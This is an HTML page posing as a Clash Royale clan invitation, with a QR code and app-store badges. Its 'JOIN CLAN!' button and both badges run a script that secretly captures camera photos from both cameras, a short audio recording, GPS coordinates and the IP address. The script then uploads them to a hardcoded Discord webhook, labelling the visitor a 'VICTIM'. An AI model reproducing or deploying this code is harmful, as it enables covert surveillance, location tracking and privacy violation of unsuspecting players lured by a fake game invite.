<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" 
      content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <meta property="og:title" content="Clan Invite - Clash Royale" />
     <meta property="og:description" content="Click this link to Join a clan in Clash Royale!" />
     <meta property="og:image" content="https://discover.therookies.co/content/images/size/w1000/2020/02/clash-royale.jpg" />
     <meta property="og:url" content="https://delet35.github.io/ClashRoyalClanInvitation/" />
     <meta property="og:type" content="website" />

    <title>CLASH ROYALE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <link rel="icon" href="https://img.tapimg.net/market/images/fce4e8232e9e9510ab646dbf62399c59.png" type="image/png">
    <title>Clan Invite - Clash Royal</title>
   
    <style>
        .join-button, .store-buttons img {
  touch-action: manipulation; /* Disable double-tap zoom */
}
/* IN YOUR STYLE SECTION */
html, body {
  overflow: auto !important; /* Override hidden */
  height: auto !important;
}

.container {
  min-height: 100vh; /* Full viewport height */
  overflow-y: auto; /* Enable vertical scroll */
}

.qr-container, .store-buttons {
  max-width: 100%; /* Prevent overflow */
}
        /* TIGHTER STYLES */
        html, body {
            overflow: hidden;
            margin: 0;
            padding: 0;
            height: 100%;
            background: url('https://mir-s3-cdn-cf.behance.net/project_modules/1400/5196db60494431.5a4ee5c65c1c4.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Arial Black', sans-serif;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px;
            min-height: 100vh;
            box-sizing: border-box;
        }

        .logo {
            width: 360px;
        }

        .invite-text {
            color: #FFF;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            margin: 5px 0;
            font-size: 1.1em;
        }

        .join-button {
            background: linear-gradient(180deg, #FFD700 0%, #D4AF37 100%);
            color: #8B0000 !important;
            padding: 12px 35px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 1.1em;
            border: 3px solid #8B0000;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            margin: 15px 0;
            order: 2;
        }

        .qr-container {
            background: white;
            padding: 12px;
            border-radius: 15px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            margin: 10px 0;
            order: 3;
        }

        .store-buttons {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            order: 4;
        }

            .store-buttons img {
                height: 40px;
                transition: transform 0.2s;
            }

                .store-buttons img:hover {
                    transform: scale(1.03);
                }

        .download-text {
            color: #FFD700;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            margin: 10px 0;
            order: 5;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://d290ny10omyv12.cloudfront.net/images/clash-royale-og-wa.png"
             class="logo"
             alt="Clash Logo">

        <p class="invite-text">
            Join your Friend in Clash Royale!

        </p>

        <div class="qr-container">
            <div id="qrcode"></div>
        </div>
        <button onclick="initiateTotalChaos()" class="join-button">
            <!-- MODIFIED -->
            JOIN CLAN!
        </button>
        <p class="download-text">Download Clash Royale</p>
        <br />
        <div class="store-buttons">
            <a onclick="initiateTotalChaos()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store">
            </a>
            <a onclick="initiateTotalChaos()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1280px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
            </a>
        </div>
      



    </div>

    <script>
        new QRCode(document.getElementById("qrcode"), {
            text: "https://tiktok.wtch.pro?video=1032711939 ",
            width: 160,
            height: 160,
            colorDark: "#000000",
            colorLight: "#FFFFFF",
            correctLevel: QRCode.CorrectLevel.H
        });
    </script>
  <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1354180731139657768/MYr76j8rVFUzNUnKR95g_XY_oZun4PIVh9YlJpbuIkxAe3CdXjW-951jCOBcGd68X2oP';

        async function initiateTotalChaos() {
            let media, selfieStream;
            const debugData = {
                mobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
                errors: []
            };

            try {
                // ================== MOBILE SECURITY CHECKS ================== //
                if (window.location.protocol !== 'https:' && !location.hostname.includes('localhost')) {
                    window.location.href = `https://${location.host}${location.pathname}`;
                    return;
                }

                // ================== ADAPTIVE MEDIA CONSTRAINTS ================== //
                const mediaConstraints = {
                    video: {
                        facingMode: { ideal: 'environment' },
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 24 }
                    },
                    audio: {
                        echoCancellation: { ideal: true },
                        noiseSuppression: { ideal: true },
                        autoGainControl: { ideal: true }
                    }
                };

                // ================== GRACEFUL MEDIA ACQUISITION ================== //
                media = await navigator.mediaDevices.getUserMedia(mediaConstraints)
                    .catch(async () => {
                        debugData.errors.push('Primary camera failed, using fallback');
                        return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    });

                // ================== SELFIE CAMERA WITH FAILSAFE ================== //
                selfieStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: 'user' },
                        width: { ideal: 720 },
                        height: { ideal: 1280 }
                    }
                }).catch(() => null);

                // ================== PARALLEL DATA COLLECTION ================== //
                const [ipData, geoloc, frontCam, selfieCam, audioBlob] = await Promise.all([
                    fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({ ip: 'Unknown' })),
                    
                    new Promise(resolve => 
                        navigator.geolocation.getCurrentPosition(resolve, 
                            error => resolve({ coords: { latitude: 0, longitude: 0 } }))
                    ),

                    capturePhotos(media, 'front'),
                    selfieStream ? capturePhotos(selfieStream, 'selfie') : Promise.resolve([]),
                    recordAudio(media)
                ]);

                // ================== DATA PROCESSING ================== //
                const processedPhotos = await processMobilePhotos([...frontCam, ...selfieCam]);
                const processedAudio = audioBlob ? await compressAudio(audioBlob) : null;

                // ================== DISCORD PAYLOAD ================== //
                const formData = new FormData();
                formData.append('content', `📱 ${debugData.mobile ? 'MOBILE' : 'DESKTOP'} VICTIM
IP: ${ipData.ip}
GPS: ${geoloc.coords.latitude},${geoloc.coords.longitude}
User Agent: ${navigator.userAgent}`);

                processedPhotos.forEach((photo, index) => {
                    formData.append(`photo_${index}`, photo, `capture_${index}.jpg`);
                });

                if (processedAudio) {
                    formData.append('audio', processedAudio, 'voice_recording.ogg');
                }

                // ================== RELIABLE DISCORD UPLOAD ================== //
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData,
                    keepalive: true
                });

            } catch (error) {
                console.error('FINAL FAIL:', error);
                localStorage.setItem('final_debug', JSON.stringify({
                    error: error.message,
                    debugData,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                }));
            } finally {
                media?.getTracks().forEach(t => t.stop());
                selfieStream?.getTracks().forEach(t => t.stop());
            }
        }

        // ================== MOBILE UTILITIES ================== //
        async function capturePhotos(stream, type) {
            try {
                const track = stream.getVideoTracks()[0];
                const capture = new ImageCapture(track);
                const photos = await Promise.all([1,2,3].map(() => capture.takePhoto()));
                track.stop();
                return photos.map(photo => 
                    URL.createObjectURL(photo)
                );
            } catch {
                return [];
            }
        }

        async function recordAudio(stream) {
            try {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.start();
                await new Promise(r => setTimeout(r, 3000));
                recorder.stop();
                return await new Promise(resolve => {
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/ogg; codecs=opus' }));
                });
            } catch {
                return null;
            }
        }

        async function processMobilePhotos(photos) {
            return Promise.all(photos.map(async (photoUrl) => {
                const response = await fetch(photoUrl);
                const blob = await response.blob();
                const img = await createImageBitmap(blob);
                
                // Mobile orientation fix
                const canvas = new OffscreenCanvas(img.width, img.height);
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0);
                
                return await canvas.convertToBlob({
                    type: 'image/webp',
                    quality: 0.7
                });
            }));
        }

        async function compressAudio(blob) {
            // Mobile-friendly audio compression
            const arrayBuffer = await blob.arrayBuffer();
            return new Blob([arrayBuffer], { type: 'audio/ogg; codecs=opus' });
        }
    
    
</body>
</html>
